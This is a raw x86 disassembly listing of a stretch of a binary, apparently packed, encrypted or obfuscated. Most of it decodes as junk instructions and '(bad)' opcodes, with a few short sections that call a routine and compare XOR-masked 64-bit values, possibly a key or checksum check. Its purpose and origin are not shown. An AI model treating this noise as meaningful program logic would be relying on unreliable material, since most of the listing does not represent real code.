  41a854:	ficom  DWORD PTR [ebp+0x5853d8b6]
  41a85a:	adc    DWORD PTR [eax+0x1ba12cbc],0x1f2ccfe3
  41a864:	fnstsw WORD PTR [eax+0x5f]
  41a867:	cdq    
  41a868:	(bad)  
  41a869:	push   ebx
  41a86a:	in     eax,0x4c
  41a86c:	repz jbe 0x41a88c
  41a86f:	loop   0x41a809
  41a871:	repz dec edi
  41a873:	or     BYTE PTR [eax],0xf1
  41a876:	data16 fwait
  41a878:	sahf   
  41a879:	inc    edx
  41a87a:	dec    esp
  41a87b:	ds jae 0x41a8f5
  41a87e:	mov    bh,0xb8
  41a880:	mov    ecx,0x439304c4
  41a885:	sahf   
  41a886:	int3   
  41a887:	shr    DWORD PTR [ecx+0x4ca0b329],0xa8
  41a88e:	nop
  41a88f:	mov    al,ds:0xe182b9d
  41a894:	mov    al,ds:0x5f92dd3f
  41a899:	push   esi
  41a89a:	nop
  41a89b:	hlt    
  41a89c:	mov    al,BYTE PTR gs:[eax-0x5c]
  41a8a0:	add    DWORD PTR [edx-0x5d],0xffffffaa
  41a8a4:	daa    
  41a8a5:	mov    dh,0xf9
  41a8a7:	lock mov edi,DWORD PTR [ebp-0x1218aa52]
  41a8ae:	sbb    edx,DWORD PTR [esi+0x0]
  41a8b1:	mov    ebx,0x8430ebc5
  41a8b6:	xor    BYTE PTR [eax],dh
  41a8b8:	cmc    
  41a8b9:	push   ecx
  41a8ba:	fcomp  QWORD PTR [edi+0x4274bed7]
  41a8c0:	sahf   
  41a8c1:	popa   
  41a8c2:	adc    bh,dh
  41a8c4:	push   esp
  41a8c5:	stos   BYTE PTR es:[edi],al
  41a8c6:	mov    cl,0x28
  41a8c8:	jnp    0x41a92e
  41a8ca:	sbb    eax,0xdcc82992
  41a8cf:	and    ecx,DWORD PTR [ecx]
  41a8d1:	pop    ecx
  41a8d2:	sbb    DWORD PTR [esi],esp
  41a8d4:	and    al,0xb3
  41a8d6:	inc    edi
  41a8d7:	lahf   
  41a8d8:	cmp    BYTE PTR [ecx],cl
  41a8da:	call   0x2a2e65fb
  41a8df:	add    ah,BYTE PTR [esi+0x24]
  41a8e2:	stos   DWORD PTR es:[edi],eax
  41a8e3:	mov    ds:0xb4f70edc,eax
  41a8e8:	xchg   edx,eax
  41a8e9:	adc    DWORD PTR [edi],edx
  41a8eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8ec:	dec    edx
  41a8ed:	mov    esi,0x6f5b3ef1
  41a8f2:	clc    
  41a8f3:	ja     0x41a892
  41a8f5:	nop
  41a8f6:	and    DWORD PTR [edi-0x54f8dbc2],edi
  41a8fc:	dec    ebp
  41a8fd:	pop    edi
  41a8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8ff:	sbb    ebx,DWORD PTR [eax+eax*1+0x3e0f3815]
  41a906:	push   ebx
  41a907:	mov    ah,0x9f
  41a909:	ss aaa 
  41a90b:	mov    edx,0x1e0cfee
  41a910:	jle    0x41a954
  41a912:	(bad)  [ebp+ecx*1+0x1e9e31a]
  41a919:	shl    DWORD PTR ds:0xeac5d30e,1
  41a91f:	clc    
  41a920:	(bad)  [eax]
  41a922:	ins    BYTE PTR es:[edi],dx
  41a923:	leave  
  41a924:	int    0x14
  41a926:	lahf   
  41a927:	hlt    
  41a928:	cs push edx
  41a92a:	aaa    
  41a92b:	cwde   
  41a92c:	pop    edx
  41a92d:	pop    es
  41a92e:	add    eax,DWORD PTR [edi+0x6c]
  41a931:	or     DWORD PTR [ebx+0x79],edi
  41a934:	inc    esp
  41a935:	das    
  41a936:	loopne 0x41a978
  41a938:	popf   
  41a939:	push   ss
  41a93a:	dec    edx
  41a93b:	das    
  41a93c:	mov    WORD PTR [edx+0x21],ss
  41a93f:	shr    DWORD PTR [edi+0x3c],cl
  41a942:	pop    ss
  41a943:	rol    BYTE PTR [esi+0x1f6b8948],0xd0
  41a94a:	push   cs
  41a94b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a94c:	dec    ebp
  41a94d:	or     al,0xc9
  41a94f:	sar    BYTE PTR [ebx+0x7d],1
  41a952:	es in  al,dx
  41a954:	jg     0x41a95b
  41a956:	mov    al,ds:0x6d79a5af
  41a95b:	dec    edi
  41a95c:	cmp    BYTE PTR [ebx-0x6d8092af],ah
  41a962:	mov    ebx,0x94161ff
  41a967:	adc    esp,DWORD PTR [edi]
  41a969:	or     eax,0xe6fafb4b
  41a96e:	test   DWORD PTR [edx+ebx*4],0xb4adfdc6
  41a975:	dec    ebp
  41a976:	jl     0x41a940
  41a978:	not    BYTE PTR [esi+0x1c]
  41a97b:	mov    WORD PTR [ebx+0x43],?
  41a97e:	sub    DWORD PTR [edi-0x2d12af5f],0xf68fa7f0
  41a988:	das    
  41a989:	retf   
  41a98a:	cmp    eax,0xfecb2e71
  41a98f:	or     DWORD PTR [edi+0x15],ebx
  41a992:	ret    0xc2c8
  41a995:	test   DWORD PTR [esp+ebx*1+0x48f58c8c],0x61c282a1
  41a9a0:	scas   al,BYTE PTR es:[edi]
  41a9a1:	jg     0x41a9bc
  41a9a3:	popa   
  41a9a4:	xchg   DWORD PTR ds:0xa321cc0c,esi
  41a9aa:	xlat   BYTE PTR ds:[ebx]
  41a9ab:	repz retf 
  41a9ad:	cli    
  41a9ae:	or     bl,BYTE PTR [esi+0x3f335022]
  41a9b4:	in     eax,0xdd
  41a9b6:	retf   
  41a9b7:	add    dl,cl
  41a9b9:	pushf  
  41a9ba:	(bad)  
  41a9bb:	in     eax,dx
  41a9bc:	fmulp  st(5),st
  41a9be:	sub    edx,DWORD PTR [eax-0x3a]
  41a9c1:	sti    
  41a9c2:	repz or edx,DWORD PTR [edi+0x5d]
  41a9c6:	and    al,0xda
  41a9c8:	or     eax,0xf48f78b9
  41a9cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9ce:	imul   edi,DWORD PTR ds:0x234348fc,0x50596d45
  41a9d8:	je     0x41aa59
  41a9da:	out    0x69,eax
  41a9dc:	push   eax
  41a9dd:	adc    al,0x3f
  41a9df:	out    dx,al
  41a9e0:	out    0x31,al
  41a9e2:	pop    ss
  41a9e3:	mov    bh,dl
  41a9e5:	fcmovnb st,st(3)
  41a9e7:	scas   eax,DWORD PTR es:[edi]
  41a9e8:	dec    esp
  41a9e9:	or     dh,ch
  41a9eb:	dec    ebp
  41a9ec:	fcmovb st,st(2)
  41a9ee:	rcr    BYTE PTR [ebp-0x39],cl
  41a9f1:	jmp    0xdd21e8fb
  41a9f6:	loopne 0x41a9d4
  41a9f8:	outs   dx,DWORD PTR ds:[esi]
  41a9f9:	aad    0x8d
  41a9fb:	xor    DWORD PTR [edi-0x3c],ecx
  41a9fe:	test   al,0x4
  41aa00:	out    0x73,eax
  41aa02:	jmp    0xbd9d:0x68fdc6
  41aa09:	mov    ah,0x18
  41aa0b:	call   0x217e7e70
  41aa10:	dec    esp
  41aa11:	inc    eax
  41aa12:	neg    DWORD PTR gs:[eax]
  41aa15:	shl    BYTE PTR [ecx+edi*4-0x7],1
  41aa19:	and    BYTE PTR [edx],bh
  41aa1b:	or     DWORD PTR [ebx+0x12],esi
  41aa1e:	cli    
  41aa1f:	push   ebx
  41aa20:	enter  0x3996,0x83
  41aa24:	add    DWORD PTR [ecx+esi*4-0x46],esi
  41aa28:	add    DWORD PTR [edi+0x59bbea7a],ebx
  41aa2e:	(bad)  
  41aa2f:	mov    ss,WORD PTR [ebx+0x11]
  41aa32:	ror    DWORD PTR [edx],cl
  41aa34:	in     eax,dx
  41aa35:	out    0x10,eax
  41aa37:	cmp    al,0xf2
  41aa39:	add    BYTE PTR [ebp+0x3b],0xb5
  41aa3d:	sub    al,0x17
  41aa3f:	into   
  41aa40:	push   es
  41aa41:	mov    eax,ds:0x18d7ce6c
  41aa46:	push   ebx
  41aa47:	mov    ebx,0x7f3a35c6
  41aa4c:	cmp    DWORD PTR [edi-0x5a],esi
  41aa4f:	loop   0x41a9ee
  41aa51:	or     al,0xf9
  41aa53:	adc    BYTE PTR [eax+0x7],0x6d
  41aa57:	jbe    0x41aa27
  41aa59:	dec    edi
  41aa5a:	jae    0x41aa4f
  41aa5c:	aam    0x99
  41aa5e:	xchg   edi,eax
  41aa5f:	call   0x9c3b:0x3887c33d
  41aa66:	imul   eax,DWORD PTR [eax-0x77c7add1],0xcc9477e9
  41aa70:	clc    
  41aa71:	jnp    0x41aad3
  41aa73:	sub    DWORD PTR [ebx+0x23196b21],eax
  41aa79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa7a:	fldenv [eax-0x62e73140]
  41aa80:	xor    DWORD PTR [eax-0x10],edi
  41aa83:	push   cs
  41aa84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa85:	loopne 0x41aaf9
  41aa87:	push   0x57
  41aa89:	pop    es
  41aa8a:	push   0x1b922807
  41aa8f:	arpl   WORD PTR [eax+edi*2-0x7c],sp
  41aa93:	mov    al,0xf8
  41aa95:	push   edx
  41aa96:	retf   
  41aa97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa98:	mov    eax,ds:0xe23b37c
  41aa9d:	icebp  
  41aa9e:	cmp    eax,0x11bb2dc
  41aaa3:	mov    ebp,DWORD PTR [esp+ecx*8-0x7882a59e]
  41aaaa:	pop    ds
  41aaab:	mov    edx,0x61c38b1d
  41aab0:	dec    ecx
  41aab1:	aam    0x31
  41aab3:	bsr    edi,DWORD PTR [ecx+0x5d304789]
  41aaba:	dec    ebx
  41aabb:	add    dh,BYTE PTR [eax+0x54]
  41aabe:	cli    
  41aabf:	sbb    al,0x74
  41aac1:	ja     0x41aa86
  41aac3:	rcr    BYTE PTR [esp+ebx*8-0x2099f4a6],1
  41aaca:	std    
  41aacb:	adc    BYTE PTR [edi],cl
  41aacd:	ficomp DWORD PTR [esi-0x3d]
  41aad0:	and    ah,BYTE PTR [ebp-0x3fa566dd]
  41aad6:	les    ebp,FWORD PTR [ebx+0x40]
  41aad9:	test   BYTE PTR [eax],dh
  41aadb:	in     eax,dx
  41aadc:	mov    ebx,?
  41aade:	fldz   
  41aae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aae1:	nop
  41aae2:	dec    ecx
  41aae3:	push   ds
  41aae4:	mov    al,ds:0xabc17c4b
  41aae9:	jl     0x41aaf9
  41aaeb:	inc    ecx
  41aaec:	add    BYTE PTR [ecx-0x7a8f7453],0x56
  41aaf3:	or     al,0xb6
  41aaf5:	loope  0x41aaa3
  41aaf7:	xchg   ebp,eax
  41aaf8:	pop    ebx
  41aaf9:	cmp    al,0x9b
  41aafb:	(bad)  
  41aafc:	shr    BYTE PTR [ecx-0x76],0xad
  41ab00:	shl    BYTE PTR [edx-0x4ae950f0],0x8b
  41ab07:	pop    esp
  41ab08:	and    al,0x34
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x422031
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x422031
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax+0x7e1b307f],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1+0x7be61818],bh
  41ab67:	es mul esi
  41ab6a:	retf   0x4761
  41ab6d:	lods   al,BYTE PTR ds:[esi]
  41ab6e:	mov    ds:0x2f7ffd5e,al
  41ab73:	mov    dh,0x6f
  41ab75:	cmp    eax,0xe99f7a42
  41ab7a:	or     eax,0x6b6c4478
  41ab7f:	nop
  41ab80:	xor    eax,0x9904ba4b
  41ab85:	sub    ebx,ebx
  41ab87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab88:	xchg   esi,eax
  41ab89:	test   BYTE PTR [edx+0x1f517c5c],ah
  41ab8f:	ss retf 
  41ab91:	ins    BYTE PTR es:[edi],dx
  41ab92:	scas   al,BYTE PTR es:[edi]
  41ab93:	add    al,al
  41ab95:	sub    BYTE PTR [esi],bl
  41ab97:	dec    ecx
  41ab98:	mov    ds:0x3b970502,eax
  41ab9d:	jns    0x41abf9
  41ab9f:	mov    ecx,0x13f266ba
  41aba4:	pop    ss
  41aba5:	mov    eax,0x7b7867b7
  41abaa:	and    al,0x47
  41abac:	mov    edi,0xda7a6132
  41abb1:	and    eax,0x973aafc0
  41abb7:	cli    
  41abb8:	sbb    bh,BYTE PTR [ebp+0x17]
  41abbb:	imul   edi,DWORD PTR [edx],0x91977adb
  41abc1:	sbb    al,0xb7
  41abc3:	sub    BYTE PTR [esi-0x49],dl
  41abc6:	push   esp
  41abc7:	sub    eax,0xec10d36a
  41abcc:	rcr    BYTE PTR [ecx+0x54],0xa2
  41abd0:	jo     0x41abf1
  41abd2:	or     al,0xb4
  41abd4:	les    esi,FWORD PTR [edi-0x3c277140]
  41abda:	sbb    eax,0x85a4ead9
  41abdf:	push   0x6631958e
  41abe4:	in     eax,dx
  41abe5:	leave  
  41abe6:	xchg   ecx,eax
  41abe7:	lods   al,BYTE PTR ds:[esi]
  41abe8:	dec    ecx
  41abe9:	dec    BYTE PTR [eax]
  41abeb:	mov    ecx,0x4b714764
  41abf0:	lahf   
  41abf1:	jmp    0xec9d4e40
  41abf6:	sbb    al,0x9
  41abf8:	dec    eax
  41abf9:	add    al,0x35
  41abfb:	inc    ebx
  41abfc:	jb     0x41abf9
  41abfe:	je     0x41ab95
  41ac00:	mov    ch,0x61
  41ac02:	lock in al,0x37
  41ac05:	dec    edx
  41ac06:	test   eax,0x1aa892bd
  41ac0b:	sbb    al,0x6a
  41ac0d:	cs aaa 
  41ac0f:	(bad)  
  41ac10:	ret    
  41ac11:	pushf  
  41ac12:	push   ebx
  41ac13:	call   0xb0eafe81
  41ac18:	mov    cl,0xca
  41ac1a:	stos   BYTE PTR es:[edi],al
  41ac1b:	xlat   BYTE PTR ds:[ebx]
  41ac1c:	gs jnp 0x41ac16
  41ac1f:	stos   BYTE PTR es:[edi],al
  41ac20:	cmp    eax,0x71961631
  41ac25:	mov    BYTE PTR [ecx-0x47],ah
  41ac28:	fsubr  st(2),st
  41ac2a:	mov    ebx,0xf242cbd9
  41ac2f:	std    
  41ac30:	mov    al,0x5d
  41ac32:	jne    0x41abbb
  41ac34:	jmp    0x41ac28
  41ac36:	loope  0x41aca3
  41ac38:	xchg   edi,eax
  41ac39:	sbb    eax,0x3019be63
  41ac3e:	xor    cl,BYTE PTR cs:[ecx]
  41ac41:	(bad)  
  41ac42:	mov    ds:0x15cb1c37,eax
  41ac47:	and    DWORD PTR ds:0x9154e3b5,esp
  41ac4d:	mov    DWORD PTR [edi],0x5982adf8
  41ac53:	sub    cl,cl
  41ac55:	xchg   BYTE PTR [ecx],al
  41ac57:	fstp   QWORD PTR [ebx+eiz*4-0x5a77744]
  41ac5e:	or     al,dh
  41ac60:	xchg   ebx,eax
  41ac61:	dec    edi
  41ac62:	dec    ebp
  41ac63:	dec    edi
  41ac64:	inc    edi
  41ac65:	addr16 js 0x41acc3
  41ac68:	div    BYTE PTR [ecx+esi*1]
  41ac6b:	sti    
  41ac6c:	cwde   
  41ac6d:	add    BYTE PTR [eax+0x7b6e3303],bl
  41ac73:	jge    0x41ac97
  41ac75:	add    al,0xb1
  41ac77:	test   eax,0xf2924ced
  41ac7c:	sub    DWORD PTR [esi+0xc8ce700],edi
  41ac82:	retf   0x1b12
  41ac85:	cwde   
  41ac86:	call   0x27a6d8c5
  41ac8b:	pushf  
  41ac8c:	rol    DWORD PTR [esi+esi*2+0x6d],1
  41ac90:	jo     0x41ac34
  41ac92:	and    dh,ah
  41ac94:	outs   dx,DWORD PTR ds:[esi]
  41ac95:	jb     0x41ac3f
  41ac97:	je     0x41acad
  41ac99:	pop    ss
  41ac9a:	pop    ebx
  41ac9b:	push   0x3998d678
  41aca0:	ins    BYTE PTR es:[edi],dx
  41aca1:	jbe    0x41aca0
  41aca3:	pop    edx
  41aca4:	xchg   edi,eax
  41aca5:	sbb    BYTE PTR [esi+0x72949bd9],bl
  41acab:	in     al,dx
  41acac:	ret    
  41acad:	push   0xfcbea085
  41acb2:	pop    edi
  41acb3:	sbb    bh,BYTE PTR [edx-0x125e85c7]
  41acb9:	out    dx,al
  41acba:	test   eax,0x4a3d9c16
  41acbf:	or     ebp,DWORD PTR [ecx+0x66]
  41acc2:	pop    edx
  41acc3:	xchg   esi,eax
  41acc4:	mov    ebx,0x768c13a7
  41acc9:	retf   
  41acca:	aaa    
  41accb:	mov    dh,BYTE PTR [eax-0x535098c9]
  41acd1:	leave  
  41acd2:	jp     0x41acce
  41acd4:	addr16 das 
  41acd6:	xchg   ebx,eax
  41acd7:	ret    
  41acd8:	jecxz  0x41acef
  41acda:	jmp    0x175c:0x73df16d4
  41ace1:	mov    BYTE PTR [esi+0x1b],bl
  41ace4:	xchg   cl,bh
  41ace6:	loopne 0x41ad3b
  41ace8:	mov    ds:0x7df8b33e,al
  41aced:	lahf   
  41acee:	int3   
  41acef:	pop    ebx
  41acf0:	xor    dl,dh
  41acf2:	mov    ds:0x1707b4ec,eax
  41acf7:	mov    eax,ds:0x966f4bff
  41acfc:	test   DWORD PTR [esi+0x1e2bb8b0],eax
  41ad02:	lods   al,BYTE PTR ds:[esi]
  41ad03:	mov    eax,0xc5bbf793
  41ad08:	(bad)  
  41ad09:	aas    
  41ad0a:	rep stos BYTE PTR es:[edi],al
  41ad0c:	out    0x3e,eax
  41ad0e:	pop    ebp
  41ad0f:	lahf   
  41ad10:	jbe    0x41ad37
  41ad12:	mov    eax,ds:0xb4219637
  41ad17:	lods   al,BYTE PTR ds:[esi]
  41ad18:	out    dx,eax
  41ad19:	xor    ebx,DWORD PTR ds:0x3294bf3c
  41ad1f:	mov    bh,0x3b
  41ad21:	leave  
  41ad22:	xchg   edi,eax
  41ad23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad24:	pop    ebx
  41ad25:	sbb    DWORD PTR [edi],eax
  41ad27:	fwait
  41ad28:	sbb    ebp,0x6e80e79f
  41ad2e:	jne    0x41ad95
  41ad30:	xchg   ecx,eax
  41ad31:	das    
  41ad32:	jmp    0x6164a4a6
  41ad37:	adc    eax,0xfcc1030e
  41ad3c:	mov    edi,0x1f8b48f5
  41ad41:	xor    bh,BYTE PTR [edx+0x1f]
  41ad44:	mov    dl,0x9
  41ad46:	stos   BYTE PTR es:[edi],al
  41ad47:	fadd   st(2),st
  41ad49:	mov    ah,0x2e
  41ad4b:	push   edi
  41ad4c:	adc    BYTE PTR es:[eax-0x3d034efe],bl
  41ad53:	xchg   edx,eax
  41ad54:	push   esp
  41ad55:	xchg   esp,eax
  41ad56:	std    
  41ad57:	shr    DWORD PTR [edx+0x20f1a54a],cl
  41ad5d:	fdiv   st,st(1)
  41ad5f:	inc    esp
  41ad60:	push   ss
  41ad61:	rcr    DWORD PTR gs:[edi+ecx*8],cl
  41ad65:	iret   
  41ad66:	and    BYTE PTR [esi-0x3f7aa3dd],ah
  41ad6c:	rol    BYTE PTR [ebx],cl
  41ad6e:	dec    edi
  41ad6f:	aas    
  41ad70:	mov    dh,0xc8
  41ad72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad73:	mov    cl,0x1
  41ad75:	hlt    
  41ad76:	adc    eax,0x8a02802
  41ad7b:	mov    esi,esp
  41ad7d:	cmp    ah,ah
  41ad7f:	jae    0x41ad6e
  41ad81:	and    al,0x69
  41ad83:	xor    al,BYTE PTR [esi]
  41ad85:	(bad)  
  41ad86:	std    
  41ad87:	sbb    al,0x89
  41ad89:	repnz inc eax
  41ad8b:	(bad)  
  41ad8c:	lea    edi,[eax+ebp*1+0x46]
  41ad90:	repz mov ebx,0x667028c5
  41ad96:	push   cs
  41ad97:	js     0x41ad41
  41ad99:	jl     0x41adaf
  41ad9b:	push   es
  41ad9c:	xchg   edx,eax
  41ad9d:	mov    ah,0x6d
  41ad9f:	loopne 0x41adb1
  41ada1:	in     eax,0x17
  41ada3:	nop
  41ada4:	xchg   edi,eax
  41ada5:	pop    ebx
  41ada6:	pop    ss
  41ada7:	ss in  eax,0xb2
  41adaa:	neg    DWORD PTR [edx]
  41adac:	jo     0x41ad9e
  41adae:	jge    0x41ae12
  41adb0:	add    DWORD PTR [edx+0x60caeb11],eax
  41adb6:	sar    DWORD PTR [eax-0x165b87de],1
  41adbc:	scas   eax,DWORD PTR es:[edi]
  41adbd:	dec    eax
  41adbe:	ret    
  41adbf:	inc    ebp
  41adc0:	sbb    ecx,eax
  41adc2:	dec    ebx
  41adc3:	adc    eax,0xda3cdfea
  41adc8:	je     0x41ad8a
  41adca:	ror    BYTE PTR ds:0xc4785671,cl
  41add0:	call   0x70d6:0x329b0148
  41add7:	ret    0x573e
  41adda:	loopne 0x41ae57
  41addc:	xor    esp,edx
  41adde:	(bad)  
  41addf:	out    dx,al
  41ade0:	sbb    al,0x2f
  41ade2:	out    0xb7,al
  41ade4:	push   edi
  41ade5:	or     BYTE PTR [esi],dl
  41ade7:	jge    0x41ae37
  41ade9:	test   DWORD PTR [eax+0x57954930],ecx
  41adef:	push   ss
  41adf0:	cld    
  41adf1:	cmp    cl,BYTE PTR [edi+0x63]
  41adf4:	cli    
  41adf5:	fninit 
  41adf7:	pop    esi
  41adf8:	rcr    BYTE PTR [edx+0xe],0xe8
  41adfc:	and    bh,BYTE PTR [edi-0x5c10045d]
  41ae02:	cmc    
  41ae03:	loop   0x41adb5
  41ae05:	adc    eax,0xbf7c4032
  41ae0a:	sbb    DWORD PTR [edi-0x3c],ebx
  41ae0d:	inc    ebx
  41ae0e:	aas    
  41ae0f:	lods   al,BYTE PTR ds:[esi]
  41ae10:	dec    edx
  41ae11:	pop    edx
  41ae12:	jo     0x41ae24
  41ae14:	lds    ebp,FWORD PTR [edi]
  41ae16:	test   BYTE PTR [edi+eax*8+0x2142d00f],0xf3
  41ae1e:	dec    ecx
  41ae1f:	add    bl,ah
  41ae21:	lods   al,BYTE PTR ds:[esi]
  41ae22:	call   0x1242:0x8267433d
  41ae29:	sub    esp,DWORD PTR [ecx+0x1b436ecf]
  41ae2f:	outs   dx,DWORD PTR ds:[esi]
  41ae30:	xchg   edx,eax
  41ae31:	and    ebx,DWORD PTR [edi-0x45]
  41ae34:	lods   eax,DWORD PTR ds:[esi]
  41ae35:	push   es
  41ae36:	cwde   
  41ae37:	sbb    edi,esi
  41ae39:	into   
  41ae3a:	addr16 or eax,0x45174499
  41ae40:	pop    eax
  41ae41:	mov    eax,0xbcab54b5
  41ae46:	cmp    BYTE PTR ds:0x84d9205d,0xe8
  41ae4d:	mov    ecx,0x570e09d6
  41ae52:	xor    eax,0x28b2c3e0
  41ae57:	mov    dl,0x31
  41ae59:	pop    es
  41ae5a:	test   BYTE PTR [edi],bl
  41ae5c:	rol    DWORD PTR [ebp+0x22bcfff4],1
  41ae62:	imul   eax,esi,0x52
  41ae65:	push   ecx
  41ae66:	lds    edx,FWORD PTR [eax+0x3f]
  41ae69:	mov    dh,0xf7
  41ae6b:	mov    dl,0x5a
  41ae6d:	cmp    BYTE PTR [ebp-0x2e],0xa1
  41ae71:	nop
  41ae72:	cmp    DWORD PTR [eax-0x13],esi
  41ae75:	sbb    al,0x9f
  41ae77:	repnz stc 
  41ae79:	or     esi,DWORD PTR [eax-0x78c1b52d]
  41ae7f:	fsubr  QWORD PTR [eax-0x26]
  41ae82:	mov    ds:0xc6b7f54d,eax
  41ae87:	fdivr  DWORD PTR [edx-0x291440f1]
  41ae8d:	test   ah,al
  41ae8f:	pop    ebp
  41ae90:	jne    0x41aebe
  41ae92:	xchg   esi,eax
  41ae93:	cmp    DWORD PTR [edx-0x29d0d2ee],edi
  41ae99:	push   esi
  41ae9a:	enter  0xc268,0xdc
  41ae9e:	mov    eax,ebx
  41aea0:	sub    eax,0xe12cb8da
  41aea5:	scas   al,BYTE PTR es:[edi]
  41aea6:	aas    
  41aea7:	cmp    DWORD PTR [ecx-0x7ddec1a1],esp
  41aead:	in     eax,dx
  41aeae:	idiv   BYTE PTR [edi+edi*2+0x1780b2aa]
  41aeb5:	push   ecx
  41aeb6:	push   edx
  41aeb7:	mov    ah,0x2d
  41aeb9:	neg    DWORD PTR [ecx+0x638235b9]
  41aebf:	mov    al,ds:0x8100994b
  41aec4:	pop    ecx
  41aec5:	mov    bh,0x37
  41aec7:	out    dx,al
  41aec8:	loope  0x41aef9
  41aeca:	clc    
  41aecb:	push   ebx
  41aecc:	in     eax,dx
  41aecd:	and    edx,esp
  41aecf:	(bad)  
  41aed0:	push   ss
  41aed1:	inc    ebx
  41aed2:	mov    ebp,0x36d9eedb
  41aed7:	(bad)  
  41aed8:	(bad)  
  41aed9:	sti    
  41aeda:	or     BYTE PTR [ebx-0x7c],dl
  41aedd:	mov    esi,ebx
  41aedf:	popf   
  41aee0:	loop   0x41aea4
  41aee2:	add    al,0xdf
  41aee4:	inc    ebx
  41aee5:	sub    BYTE PTR [eax-0x7e],ch
  41aee8:	xlat   BYTE PTR ds:[ebx]
  41aee9:	sub    eax,0x6dcfa0
  41aeee:	aaa    
  41aeef:	and    al,0xad
  41aef1:	rcr    bh,cl
  41aef3:	out    dx,al
  41aef4:	cli    
  41aef5:	enter  0x5777,0x96
  41aef9:	jmp    0x41af5d
  41aefb:	pop    ecx
  41aefc:	and    al,0xc1
  41aefe:	or     eax,ebx
  41af00:	les    edi,FWORD PTR [edi+0x73]
  41af03:	out    0x8e,eax
  41af05:	fst    QWORD PTR [edi+0x77]
  41af08:	sub    DWORD PTR [edx-0x73],eax
  41af0b:	stos   BYTE PTR es:[edi],al
  41af0c:	js     0x41aefb
  41af0e:	inc    ebp
  41af0f:	and    DWORD PTR [ecx-0x15],eax
  41af12:	mov    ah,0x6e
  41af14:	stc    
  41af15:	mov    ah,0xa0
  41af17:	je     0x41d921
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41afa1
  41af80:	sbb    BYTE PTR [ebx+0x16971770],bl
  41af86:	sbb    BYTE PTR [edx+edx*1-0x25a0e7e8],bh
  41af8d:	and    al,0x30
  41af8f:	dec    ebx
  41af90:	jbe    0x41af90
  41af92:	lahf   
  41af93:	retf   0x7165
  41af96:	retf   0x1c
  41af99:	push   cs
  41af9a:	popa   
  41af9b:	cvttps2pi mm1,QWORD PTR [esi]
  41af9e:	mov    DWORD PTR [ebp+0x3f],edi
  41afa1:	sub    al,0x28
  41afa3:	push   0xffffff92
  41afa5:	dec    edx
  41afa6:	arpl   cx,bx
  41afa8:	pop    eax
  41afa9:	xchg   esi,eax
  41afaa:	cmp    eax,0xb81659ed
  41afaf:	dec    esp
  41afb0:	xchg   esi,eax
  41afb1:	fnsave [esi-0x420ae327]
  41afb7:	xor    ah,BYTE PTR [eax-0x2a]
  41afba:	aam    0x43
  41afbc:	mov    edx,0xe38b35da
  41afc1:	sub    bh,BYTE PTR [ebp-0x7693734a]
  41afc7:	mov    al,ds:0x134c618c
  41afcc:	es pop edx
  41afce:	loope  0x41aff7
  41afd0:	arpl   WORD PTR [edi-0x43adada4],bx
  41afd6:	inc    edx
  41afd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afd8:	cmp    DWORD PTR [edx],edi
  41afda:	leave  
  41afdb:	add    DWORD PTR [ecx],ebx
  41afdd:	sahf   
  41afde:	cmp    esi,DWORD PTR [ebx]
  41afe0:	outs   dx,DWORD PTR ds:[esi]
  41afe1:	fist   WORD PTR [ecx-0xbd81fa8]
  41afe7:	mov    ch,BYTE PTR [ebx]
  41afe9:	fmul   DWORD PTR [edi]
  41afeb:	jnp    0x41b02c
  41afed:	test   cl,0xf7
